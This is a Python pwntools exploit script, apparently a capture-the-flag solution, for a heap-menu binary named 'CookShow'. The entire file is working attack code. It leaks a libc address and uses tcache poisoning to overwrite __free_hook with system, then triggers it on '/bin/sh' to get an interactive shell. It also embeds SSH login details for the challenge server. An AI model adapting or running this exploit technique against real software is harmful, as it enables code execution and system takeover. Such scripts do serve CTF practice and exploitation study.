from pwn import *
context.log_level = 'debug'

TARGET = './CookShow'
HOST = ''
PORT = 0 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(TARGET, stdout=process.PTY, stdin=process.PTY)

    else:
        print "remote" 
        # return remote(HOST, PORT)
        return process('sh', stdout=process.PTY, stdin=process.PTY)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, []) 

if args.R:
    r.sendline('ssh yeet@ctf.kaf.sh -p 7030')
    r.sendlineafter('password:', '12345678')


r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '200') 
r.sendlineafter(':', 'AAAA') 

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '1') 
r.sendlineafter(':', '8') 
r.sendlineafter(':', 'AAAA') 

for i in range(8):
    r.sendlineafter('Choose:', '2') 
    r.sendlineafter('Big', '3') 

r.sendlineafter('Choose:', '3') 
r.sendlineafter('Big\n', '3') 
leak = u64(r.recv(6).ljust(8, '\x00'))
dbg("leak")
base = leak - 0x3ebca0
system = base + 0x4f440
fh = base + 0x3ed8e8

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '240') 
r.sendlineafter(':', 'AAAA') 

for i in range(2):
    r.sendlineafter('Choose:', '2') 
    r.sendlineafter('Big', '3') 

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '240') 
r.sendlineafter(':', p64(fh)) 

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '240') 
r.sendlineafter(':', p64(fh)) 

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '240') 
r.sendlineafter(':', p64(system)) 

r.sendlineafter('Choose:', '1') 
r.sendlineafter('Big', '3') 
r.sendlineafter(':', '280') 
r.sendlineafter(':', "/bin/sh") 

r.sendlineafter('Choose:', '2') 
r.sendlineafter('Big', '3') 

r.interactive()

